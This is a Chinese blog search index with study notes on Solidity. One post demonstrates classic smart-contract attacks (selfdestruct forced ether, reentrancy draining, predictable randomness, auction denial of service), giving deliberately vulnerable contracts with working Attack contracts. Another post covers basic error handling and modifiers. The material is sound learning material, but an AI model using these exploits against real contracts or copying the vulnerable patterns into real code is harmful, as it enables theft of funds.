<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>solidity基础攻击</title>
      <link href="/2022/10/28/2022-11-26%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
      <url>/2022/10/28/2022-11-26%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="这是我第一篇文章"><a href="#这是我第一篇文章" class="headerlink" title="这是我第一篇文章"></a>这是我第一篇文章</h2><div class="note default simple"><p>我的小标签 </p></div><h1 id="solidity漏洞"><a href="#solidity漏洞" class="headerlink" title="solidity漏洞"></a>solidity漏洞</h1><h3 id="1，自毁函数攻击"><a href="#1，自毁函数攻击" class="headerlink" title="1，自毁函数攻击"></a>1，自毁函数攻击</h3><p><strong>通过selfdestruce自会函数进行强制转账，导致合约中受到7ether，然后卡死</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: HIT</span><br><span class="line">pragma solidity^0.8.0;</span><br><span class="line">contract EtherGame&#123;#幸运七游戏：第七个传入以太币的人会得到前面的以太币</span><br><span class="line">    address public winner;</span><br><span class="line">    uint TARGET_AMOUNT=7 ether;</span><br><span class="line">    function deposit()public payable&#123;</span><br><span class="line">        require(msg.value==1 ether,&quot;you can only send 1 ether&quot;);</span><br><span class="line">        uint balances=address(this).balance;</span><br><span class="line">        require(balances&lt;=TARGET_AMOUNT,&quot;game is over&quot;);</span><br><span class="line">        if(balances==TARGET_AMOUNT)&#123;</span><br><span class="line">            winner=msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender==winner,&quot;not pass&quot;);</span><br><span class="line">        (bool send,)=msg.sender.call&#123;value: address(this).balance&#125;(&quot;&quot;);</span><br><span class="line">        require(send,&quot;failed&quot;);</span><br><span class="line">        winner=address(0);</span><br><span class="line">    &#125;</span><br><span class="line">    function getbalance()public view returns(uint)&#123;</span><br><span class="line">    return address(this).balance;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    constructor()payable&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack(address  to)external&#123;</span><br><span class="line">            selfdestruct(payable(to));</span><br><span class="line">    &#125;</span><br><span class="line">    function getBalance()public view returns(uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="2，重入攻击"><a href="#2，重入攻击" class="headerlink" title="2，重入攻击"></a>2，重入攻击</h3><p><strong>该攻击利用fallback函数的触发来做到递归取款，一直会取以太只到取完。fallback触发条件为：1.收到以太 2.调用合约中不存在的函数时</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.7.6;#重入攻击只能在0.8.0版本以下</span><br><span class="line">contract Bank &#123;</span><br><span class="line"> mapping(address =&gt; uint) public balances; //账本，用来记录每一个用户的账户余额</span><br><span class="line"> //取款</span><br><span class="line"> function withdraw(uint _amount) external payable &#123;</span><br><span class="line">     //用户余额大于存款额，否侧错误</span><br><span class="line">     require (balances[msg.sender] &gt;= _amount,&quot;balance is insufficient&quot;);</span><br><span class="line">     //转账给用户</span><br><span class="line">     (bool sent,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">     //是否成功，不成功返回数据</span><br><span class="line">     require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">     //扣除转出去的钱</span><br><span class="line">     balances[msg.sender] -= _amount;</span><br><span class="line">     &#125;</span><br><span class="line">     //存款</span><br><span class="line">     function deposit() public payable &#123;</span><br><span class="line">          balances[msg.sender] += msg.value;//存款  [用户可使用]</span><br><span class="line">          &#125;//查看余额</span><br><span class="line">          function getBalance() external view returns (uint) &#123;</span><br><span class="line">              return address(this).balance;</span><br><span class="line">              &#125;</span><br><span class="line">              constructor() payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    //攻击目标</span><br><span class="line">    Bank public bank;</span><br><span class="line">    //参数为攻击目标的地址</span><br><span class="line">    constructor(address payable _address)payable &#123;</span><br><span class="line">        bank = Bank(_address);</span><br><span class="line">        &#125;</span><br><span class="line">        //2攻击</span><br><span class="line">        function attack() external payable &#123;</span><br><span class="line">            bank.deposit&#123;value: 1 ether&#125;();//先存再取出</span><br><span class="line">            bank.withdraw(1 ether);</span><br><span class="line">            &#125;</span><br><span class="line">            //回退</span><br><span class="line">            fallback() external payable &#123;</span><br><span class="line">                if (address(bank).balance &gt;= 1 ether) &#123;</span><br><span class="line">                    bank.withdraw(1 ether);</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    // 查看合同余额</span><br><span class="line">                    function getBalance() external view returns (uint) &#123;</span><br><span class="line">                        return address(this).balance;</span><br><span class="line">                        &#125;</span><br><span class="line">                        </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="3，随机数攻击"><a href="#3，随机数攻击" class="headerlink" title="3，随机数攻击"></a>3，随机数攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: HIT</span><br><span class="line">pragma solidity^0.8.0;</span><br><span class="line">contract Random&#123;</span><br><span class="line">    function guess()public payable &#123;</span><br><span class="line">        bool result=_getRandom();</span><br><span class="line">        if(result)&#123;</span><br><span class="line">            address _to=msg.sender;</span><br><span class="line">         _to.call&#123;value:1 ether&#125;(&quot;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function _getRandom()public view returns(bool)&#123;</span><br><span class="line">        uint random=uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp)));</span><br><span class="line">        if(random%2==0)&#123;</span><br><span class="line">            return false;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;return true;&#125;</span><br><span class="line">           </span><br><span class="line">&#125;</span><br><span class="line">constructor()payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    function attack(address _random)external payable&#123;</span><br><span class="line">        for(uint i=0;i&lt;1;i++)&#123;</span><br><span class="line">            if(payable(_random).balance&lt;1)&#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            if(uint(keccak256(abi.encodePacked(block.difficulty,block.timestamp)))%2!=0)&#123;</span><br><span class="line">                Random(_random).guess();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function getBalance()external view returns(uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    receive()external payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4，拒绝服务攻击"><a href="#4，拒绝服务攻击" class="headerlink" title="4，拒绝服务攻击"></a>4，拒绝服务攻击</h3><p><strong>利用合约无法收款的特性来攻击，当合约没用fallback函数与receive函数时合约就无法收到外部转账或者退钱，因此投标函数无法完整的向下执行，不会改变winner的地址，winner会被一直霸占</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: HIT</span><br><span class="line">pragma solidity^0.8.0;</span><br><span class="line">contract  Auction&#123;</span><br><span class="line">    address public winner;</span><br><span class="line">    uint public amount;</span><br><span class="line">    function bid()external payable&#123;</span><br><span class="line">        require(msg.value&gt;0,&quot;amount is too small&quot;);</span><br><span class="line">        require(msg.value&gt;amount,&quot;amount is too small&quot;);//如不符合要求则进行回退</span><br><span class="line">        payable(winner).transfer(amount);</span><br><span class="line">        winner=msg.sender;</span><br><span class="line">        amount=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    function getBalance()external view returns(uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    receive()external payable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    constructor()payable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function attack(address target,uint amount)external payable&#123;</span><br><span class="line">        Auction(payable (target)).bid&#123;value:amount&#125;();</span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="5，访问控制攻击"><a href="#5，访问控制攻击" class="headerlink" title="5，访问控制攻击"></a>5，访问控制攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public – 公共状态变量可以在内部访问，也可以通过消息访问。对于公共状态变量，将生成一个自动getter函数。</span><br><span class="line">internal – 内部状态变量只能从当前合约或其派生合约内访问。</span><br><span class="line">private – 私有状态变量只能从当前合约内部访问，派生合约内不能访问</span><br><span class="line">external — 外部状态变量只能在合约之外调用，不能被合约内的其他函数调用。</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity基础攻击 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>我的第二篇文章</title>
      <link href="/2022/10/28/%E6%88%91%E7%9A%84%E7%AC%AC%E4%BA%8C%E7%AF%87/"/>
      <url>/2022/10/28/%E6%88%91%E7%9A%84%E7%AC%AC%E4%BA%8C%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="solidity-基础知识"><a href="#solidity-基础知识" class="headerlink" title="solidity 基础知识"></a>solidity 基础知识</h1><h3 id="报错控制的相关知识点"><a href="#报错控制的相关知识点" class="headerlink" title="报错控制的相关知识点"></a>报错控制的相关知识点</h3><p>用于检查<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract error&#123;//报错控制</span><br><span class="line">    function testrequire(uint i)public pure&#123;</span><br><span class="line">        require(i&lt;=10,&quot;i&gt;10&quot;);//不满足则报错字符串内容</span><br><span class="line">    &#125;//gas费与字符长度有关，报错之后会回滚到报错前的状态</span><br><span class="line"></span><br><span class="line">    function testrevert(uint i)public pure&#123;</span><br><span class="line">        if(i&gt;10)&#123;</span><br><span class="line">            revert(&quot;i&gt;10&quot;);</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        uint public num=123;</span><br><span class="line">        function testassert()public view&#123;</span><br><span class="line">            assert(num==123);</span><br><span class="line">        &#125;</span><br><span class="line">        function foo()public&#123;</span><br><span class="line">            num+=1;</span><br><span class="line">        &#125;//num加1之后就不满足testassert函数，再调用testassert就会报错</span><br><span class="line">        error Myerror(address caller,uint i);//自定义错误来节约gas</span><br><span class="line">        function testcustom(uint i)public view&#123;</span><br><span class="line">            if(i&gt;10)&#123;</span><br><span class="line">                revert Myerror(msg.sender,i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="函数修改器知识"><a href="#函数修改器知识" class="headerlink" title="函数修改器知识"></a>函数修改器知识</h3><p>修饰器（modifier）是 solidity 特有的语法，它就像钢铁侠的智能盔甲，有特定功能，也可以控制访问权限。modifier 的主要使用场景是运行函数前的检查，例如地址，变量，余额等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">contract functionmodifier&#123;//函数修改器</span><br><span class="line">    bool public paused;</span><br><span class="line">    uint public count;</span><br><span class="line">    function setPause(bool _paused)external&#123;</span><br><span class="line">        paused=_paused;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier whenpaused()&#123;</span><br><span class="line">        require(!paused,&quot;paused&quot;);</span><br><span class="line">        _;//表示函数其他代码在哪里运行,既运行到下划线就会跳入函数</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function inc()external whenpaused&#123;</span><br><span class="line">        //require(!paused,&quot;paused&quot;);把两个函数相同的require拿出来用函数修改器</span><br><span class="line">        count+=1;</span><br><span class="line">    &#125;</span><br><span class="line">     function dec()external whenpaused&#123;</span><br><span class="line">        //require(!paused,&quot;paused&quot;);</span><br><span class="line">        count-=1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    modifier cap(uint x)&#123;</span><br><span class="line">        require(x&lt;100,&quot;x&gt;=100&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    function incBy(uint x)external whenpaused cap(x)&#123;//先检查第一个是否满足，然后传入入参数到第二个修改器进行判断</span><br><span class="line">        count+=x;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier sandwich()&#123;//三明治修改器</span><br><span class="line">        count +=10;</span><br><span class="line">        _;</span><br><span class="line">        count *=2;</span><br><span class="line">    &#125;</span><br><span class="line">    function foo()external sandwich&#123;//先加10，再加1，最后乘2；</span><br><span class="line">        count+=1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><p>构造函数（constructor）是一种特殊的函数，每个合约可以定义一个，并在部署合约的时候自动运行一次。它可以用来初始化合约的一些参数，例如初始化合约的 owner 地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract Constructor&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint public x;</span><br><span class="line">    constructor(uint _x)&#123;//构造函数一般用于初始化变量,部署前传入_x的值</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        x = _x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结1"><a href="#总结1" class="headerlink" title="总结1"></a>总结1</h3><p>前面内容的合成<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: HIT</span><br><span class="line">pragma solidity^0.8.0;</span><br><span class="line">contract Ownable&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier onlyOwnable()&#123;</span><br><span class="line">        require(msg.sender==owner ,&quot;not owner&quot;);</span><br><span class="line">        _;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function setowner(address _newOwner)external onlyOwnable&#123;</span><br><span class="line">        require(_newOwner!=address(0),&quot;invalid address&quot;);</span><br><span class="line">        owner=_newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">    function onlyOwner()external onlyOwnable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function anyone()external&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>我的第二篇文章</title>
      <link href="/2022/10/28/c%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/10/28/c%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=" "></a> </h1>]]></content>
      
      
      <categories>
          
          <category> -c语言学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
